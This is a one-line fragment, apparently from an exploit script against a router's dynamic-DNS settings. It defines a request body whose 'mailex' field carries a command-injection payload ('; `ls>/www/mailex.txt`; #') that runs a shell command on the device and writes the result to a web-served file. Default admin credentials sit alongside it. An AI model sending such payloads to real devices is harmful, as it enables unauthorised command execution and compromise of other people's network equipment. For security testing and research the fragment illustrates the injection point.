...
data2 = {"ddns":{"DdnsP":{"enable":"1","username":"admin","password":"admin","hostname":"admin","provider":"DynDNS.org","system":"0","mailex":"; `ls>/www/mailex.txt`; #","backupmailex":"1","wildcard":"1","ip":"","status":""}}}
